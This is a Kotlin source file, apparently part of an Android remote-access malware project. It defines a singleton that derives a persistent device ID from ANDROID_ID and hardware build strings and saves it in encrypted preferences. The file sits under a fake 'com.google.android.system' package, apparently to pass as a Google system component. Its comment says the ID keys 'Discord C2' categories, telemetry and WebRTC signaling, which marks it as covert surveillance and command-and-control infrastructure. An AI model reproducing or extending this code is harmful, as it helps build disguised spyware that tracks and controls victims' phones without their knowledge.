package com.google.android.system

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log

/**
 * DeviceIdProvider
 *
 * Authoritative Device ID Generation & Persistence Singleton.
 * Ensures consistent device ID formatting ("DEV_XXXXXX") across Firebase RTDB,
 * Discord C2 Category creation, telemetry logging, and WebRTC signaling.
 */
object DeviceIdProvider {

    private const val TAG = "DeviceIdProvider"
    private const val PREF_KEY_DEVICE_ID = "device_id"
    private const val PREF_KEY_LEGACY_UUID = "device_uuid"

    @Volatile
    private var cachedDeviceId: String? = null

    /**
     * Obtains or generates the authoritative, persistent Device ID for this device.
     */
    @Synchronized
    fun getDeviceId(context: Context): String {
        cachedDeviceId?.takeIf { it.isNotBlank() }?.let { return it }

        val prefs = SecurityVaultManager.getEncryptedPrefs(context)
        var devId = prefs.getString(PREF_KEY_DEVICE_ID, null)

        // Check for legacy device_uuid if device_id is missing
        if (devId.isNullOrBlank()) {
            val legacyUuid = prefs.getString(PREF_KEY_LEGACY_UUID, null)
            if (!legacyUuid.isNullOrBlank()) {
                devId = if (legacyUuid.startsWith("DEV_")) legacyUuid else "DEV_" + Math.abs(legacyUuid.hashCode()).toString().takeLast(6)
            }
        }

        // Generate deterministic DEV_XXXXXX ID if missing
        if (devId.isNullOrBlank()) {
            val androidId = try {
                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
            } catch (_: Exception) { "" }

            val rawSeed = if (androidId.isNotBlank() && androidId != "9774d56d682e549c") {
                "$androidId-${Build.BOARD}-${Build.MODEL}"
            } else {
                "${Build.BOARD}-${Build.MODEL}-${Build.HARDWARE}"
            }

            val numericHash = Math.abs(rawSeed.hashCode()).toString().padStart(6, '0')
            devId = "DEV_" + numericHash.takeLast(6)

            prefs.edit().putString(PREF_KEY_DEVICE_ID, devId).apply()
            Log.i(TAG, "Generated and persisted authoritative Device ID: $devId")
        }

        cachedDeviceId = devId
        return devId
    }
}
